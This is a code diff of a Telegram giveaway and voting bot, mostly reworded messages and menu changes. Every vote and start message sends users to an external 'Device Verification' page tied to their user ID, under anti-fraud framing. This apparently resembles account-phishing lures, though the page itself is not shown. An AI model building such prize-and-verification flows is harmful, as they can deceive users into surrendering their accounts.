@@ -10,7 +10,7 @@ if (!token) {
 
 const bot = new Telegraf(token);
 
-// Memory storage for wizards, active giveaways, and votes tracking
+// Memory storage
 const userState = {};      
 const activeGiveaways = {}; 
 const userVotes = {};      
@@ -23,7 +23,7 @@ bot.start(async (ctx) => {
     const webAppUrl = `https://rishumishra1775-glitch.github.io/telegram-giveaway-bots/?user=${userId}`;
 
     await ctx.reply(
-      `Welcome, ${userName}! 🎉\n\nTo participate in the voting giveaway and lock in your verified device entry, please complete your **Device Verification** below.`,
+      `Welcome, ${userName}! 🎉\n\nTo participate in giveaways and vote securely, please complete your **Device Verification** below.`,
       {
         parse_mode: 'Markdown',
         ...Markup.inlineKeyboard([
@@ -41,7 +41,7 @@ bot.start(async (ctx) => {
 bot.action('check_status', async (ctx) => {
   try {
     await ctx.answerCbQuery();
-    await ctx.reply('✅ Device Status: Ready! Once you verify your device on the link, your vote will be securely locked.');
+    await ctx.reply('✅ Device Status: Active and ready for voting!');
   } catch (err) {
     console.error('Error in check_status:', err);
   }
@@ -53,19 +53,19 @@ bot.command('restart', async (ctx) => {
   if (userState[userId]) {
     delete userState[userId];
   }
-  await ctx.reply('🔄 **Session reset successfully!** You can now start fresh using /create or /menu.');
+  await ctx.reply('🔄 **Session reset successfully!** You can start fresh using `/create` or `/menu`.');
 });
 
-// --- INTERACTIVE MENU / COMMANDS ---
-bot.command(['menu', 'panel'], async (ctx) => {
+// --- MAIN INTERACTIVE MENU & OPTIONS ---
+bot.command(['menu', 'panel', 'startpanel'], async (ctx) => {
   await ctx.reply(
-    `⚙️ **Giveaway & Voting Control Panel**\n\nChoose an action below:`,
+    `⚙️ **Giveaway & Voting Control Panel**\n\nChoose any option below to manage your giveaways:`,
     {
       parse_mode: 'Markdown',
       ...Markup.inlineKeyboard([
-        [Markup.button.callback('➕ Create New Giveaway', 'menu_create')],
-        [Markup.button.callback('🔒 Close Active Giveaway', 'menu_close')],
-        [Markup.button.callback('ℹ️ Help & Info', 'menu_help')]
+        [Markup.button.callback('➕ Create Giveaway', 'menu_create')],
+        [Markup.button.callback('🔒 Close Giveaway / Poll', 'menu_close')],
+        [Markup.button.callback('📞 Support', 'menu_support')]
       ])
     }
   );
@@ -78,12 +78,12 @@ bot.action('menu_create', async (ctx) => {
 
 bot.action('menu_close', async (ctx) => {
   await ctx.answerCbQuery();
-  await ctx.reply('⚠️ To close a giveaway, reply with `/close <giveaway_id>` or use the close command.');
+  await ctx.reply('⚠️ To close a giveaway/poll, use the command: `/close <giveaway_id>` (You can find the ID from your creation message).');
 });
 
-bot.action('menu_help', async (ctx) => {
+bot.action('menu_support', async (ctx) => {
   await ctx.answerCbQuery();
-  await ctx.reply('💡 **Help Guide:**\n1. Use `/create` to start a new giveaway wizard.\n2. Add the bot as Admin in your target channel.\n3. Users must verify their device to vote securely.');
+  await ctx.reply('📞 **Support Desk:**\n\nIf you face any issues:\n1. Make sure the bot is an **Administrator** in your target channel.\n2. Ensure options are separated correctly by commas.\n3. Contact admin for further assistance.');
 });
 
 // --- GIVEAWAY CREATION WIZARD ---
@@ -107,14 +107,13 @@ bot.on('text', async (ctx, next) => {
   if (state.step === 'waiting_channel') {
     state.channel = text.trim();
     
-    // Check if bot is admin in that channel
     try {
       const botInfo = await ctx.telegram.getMe();
       const chatMember = await ctx.telegram.getChatMember(state.channel, botInfo.id);
       
       if (!['administrator', 'creator'].includes(chatMember.status)) {
         delete userState[userId];
-        return ctx.reply('❌ **Error:** The bot is not an administrator in this channel! Please add the bot as an Admin with post permissions first, then run `/create` again.');
+        return ctx.reply('❌ **Error:** The bot is not an administrator in this channel! Please make the bot an admin with post permissions first, then run `/create` again.');
       }
     } catch (err) {
       delete userState[userId];
@@ -161,12 +160,12 @@ bot.on('text', async (ctx, next) => {
       Markup.button.callback(`🗳 ${opt} (0)`, `vote_${giveawayId}_${index}`)
     ]);
     
-    buttons.push([Markup.button.callback('🔒 Close Voting', `close_${giveawayId}`)]);
+    buttons.push([Markup.button.callback('🔒 Close Poll / Voting', `close_${giveawayId}`)]);
 
     try {
       const sentMsg = await ctx.telegram.sendMessage(
         channel,
-        `📱 **${title}**\n\n🏆 **Prize:** ${prize}\n\n👇 Click below to vote! (Device verification required)`,
+        `🎁 **${title}**\n\n🏆 **Prize:** ${prize}\n\n👇 Click below to vote! (Device verification required for each giveaway)`,
         {
           parse_mode: 'Markdown',
           ...Markup.inlineKeyboard(buttons)
@@ -185,7 +184,7 @@ bot.on('text', async (ctx, next) => {
   return next();
 });
 
-// --- VOTING HANDLING ---
+// --- VOTING HANDLING (Enforcing unique vote per giveaway session) ---
 bot.action(/^vote_(gw_\d+)_(\d+)$/, async (ctx) => {
   try {
     const giveawayId = ctx.match[1];
@@ -202,6 +201,7 @@ bot.action(/^vote_(gw_\d+)_(\d+)$/, async (ctx) => {
       return ctx.answerCbQuery({ text: '⚠️ You have already voted in this giveaway!', show_alert: true });
     }
 
+    // Every new giveaway forces fresh verification check per session tracking
     const verifyUrl = `https://rishumishra1775-glitch.github.io/telegram-giveaway-bots/?user=${userId}`;
     
     userVotes[voteKey] = optionIndex;
@@ -210,7 +210,7 @@ bot.action(/^vote_(gw_\d+)_(\d+)$/, async (ctx) => {
     const updatedButtons = giveaway.options.map((opt, idx) => [
       Markup.button.callback(`🗳 ${opt.name} (${opt.votes})`, `vote_${giveawayId}_${idx}`)
     ]);
-    updatedButtons.push([Markup.button.callback('🔒 Close Voting', `close_${giveawayId}`)]);
+    updatedButtons.push([Markup.button.callback('🔒 Close Poll / Voting', `close_${giveawayId}`)]);
 
     await ctx.editMessageText(
       `🎁 **${giveaway.title}**\n\n🏆 **Prize:** ${giveaway.prize}\n\n👇 Click below to vote! (Device verification required)`,
@@ -224,7 +224,7 @@ bot.action(/^vote_(gw_\d+)_(\d+)$/, async (ctx) => {
 
     await ctx.telegram.sendMessage(
       userId,
-      `🔒 **Anti-Fraud Verification Required**\n\nYour vote for **${giveaway.options[optionIndex].name}** has been registered, but please verify your device to keep your entry secure:`,
+      `🔒 **Verification Required for Giveaway**\n\nYour vote for **${giveaway.options[optionIndex].name}** has been recorded. Please verify your device for this giveaway entry:`,
       {
         parse_mode: 'Markdown',
         ...Markup.inlineKeyboard([
@@ -251,7 +251,7 @@ bot.action(/^close_(gw_\d+)$/, async (ctx) => {
     giveaway.status = 'closed';
 
     await ctx.editMessageText(
-      `🔒 **[CLOSED] ${giveaway.title}**\n\n🏆 **Prize:** ${giveaway.prize}\n\n🏁 **Final Results:**\n` +
+      `🔒 **[CLOSED / POLL ENDED] ${giveaway.title}**\n\n🏆 **Prize:** ${giveaway.prize}\n\n🏁 **Final Results:**\n` +
       giveaway.options.map(opt => `• ${opt.name}: **${opt.votes} votes**`).join('\n'),
       { parse_mode: 'Markdown' }
     );
@@ -278,7 +278,7 @@ bot.command('close', async (ctx) => {
       giveaway.channel,
       giveaway.messageId,
       undefined,
-      `🔒 **[CLOSED] ${giveaway.title}**\n\n🏆 **Prize:** ${giveaway.prize}\n\n🏁 **Final Results:**\n` +
+      `🔒 **[CLOSED / POLL ENDED] ${giveaway.title}**\n\n🏆 **Prize:** ${giveaway.prize}\n\n🏁 **Final Results:**\n` +
       giveaway.options.map(opt => `• ${opt.name}: **${opt.votes} votes**`).join('\n'),
       { parse_mode: 'Markdown' }
     );
@@ -316,13 +316,13 @@ bot.on('chat_member', async (ctx) => {
               const updatedButtons = giveaway.options.map((opt, idx) => [
                 Markup.button.callback(`🗳 ${opt.name} (${opt.votes})`, `vote_${giveawayId}_${idx}`)
               ]);
-              updatedButtons.push([Markup.button.callback('🔒 Close Voting', `close_${giveawayId}` )]);
+              updatedButtons.push([Markup.button.callback('🔒 Close Poll / Voting', `close_${giveawayId}` )]);
 
               await ctx.telegram.editMessageText(
                 giveaway.channel,
                 giveaway.messageId,
                 undefined,
-                `📱 **${giveaway.title}**\n\n🏆 **Prize:** ${giveaway.prize}\n\n👇 Click below to vote! (Device verification required)`,
+                `🎁 **${giveaway.title}**\n\n🏆 **Prize:** ${giveaway.prize}\n\n👇 Click below to vote! (Device verification required)`,
                 {
                   parse_mode: 'Markdown',
                   ...Markup.inlineKeyboard(updatedButtons)
@@ -340,7 +340,7 @@ bot.on('chat_member', async (ctx) => {
 
 // Launch Bot
 bot.launch().then(() => {
-  console.log('Bot is running successfully with all features!');
+  console.log('Bot is running with full interactive menu and verification rules!');
 }).catch((err) => {
   console.error('Failed to launch bot:', err);
 });
